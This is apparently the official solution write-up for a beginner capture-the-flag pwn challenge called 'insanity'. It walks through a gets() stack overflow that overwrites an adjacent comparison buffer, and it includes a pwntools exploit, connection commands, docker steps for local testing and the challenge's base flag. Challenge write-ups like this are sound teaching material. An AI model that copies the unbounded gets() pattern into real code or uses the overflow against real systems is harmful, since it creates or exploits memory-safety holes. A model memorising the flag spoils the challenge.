---
title: insanity
category: pwn
difficulty: beginner
points: 100-500
author: nothoudaifa
date: 2026-11-04
---
# Solution — insanity

**Flag:** per-team dynamic flag, minted from the base
`ingehack{why_guess_when_you_can_overflow}` (the `flags/dynamic` provider
leetifies it at instance launch). The base is shown here; your instance
prints its own leet variant.

## The bug

`src/chall.c`:

```c
char input[32];
char guess[32];
...
read(fd, guess, sizeof(guess));
printf("your guess: ");
gets(input);

if (memcmp(input, guess, 32) == 0) {
    puts("nice");
    system("cat flag.txt");
}
```

`gets()` has no length limit. The two buffers are adjacent on the stack:
`input` is at `rbp-0x50`, `guess` is at `rbp-0x30`. Writing 32 bytes fills
`input`; the next 32 bytes land in `guess`. If both halves are the same 32
bytes, `memcmp(input, guess, 32)` returns 0 and the program cats the flag.

The random bytes from `/dev/urandom` are irrelevant — we overwrite them
before the comparison. The stack canary at `rbp-0x8` is not touched by a
64-byte line, so the function returns normally.

## Solve

Remote instances are TLS-wrapped (Traefik terminates TLS for the `tcp-ssl`
expose). Use the solver:

```sh
python3 solution/solve.py <host> <port>
```

or manually:

```sh
openssl s_client -quiet -connect <host>:<port> -servername <host>
# then send 64 identical characters, e.g. 64 A's, followed by Enter
```

or with nmap's ncat:

```sh
ncat --ssl --ssl-servername <host> <host> <port>
```

With pwntools:

```python
from pwn import *
io = remote("<host>", <port>, ssl=True)
io.recvuntil(b"your guess: ")
io.sendline(b"A" * 64)
print(io.recvall().decode())
```

## Local verification

```sh
docker build -t insanity .
docker run --rm -p 1337:1337 -e RCTF_FLAG='ingehack{local_test_flag}' insanity
python3 solution/solve.py 127.0.0.1 1337 --no-tls
```

Expected: `nice` followed by `ingehack{local_test_flag}`. A 32-byte line
prints `:(` because `guess` still holds the random bytes.
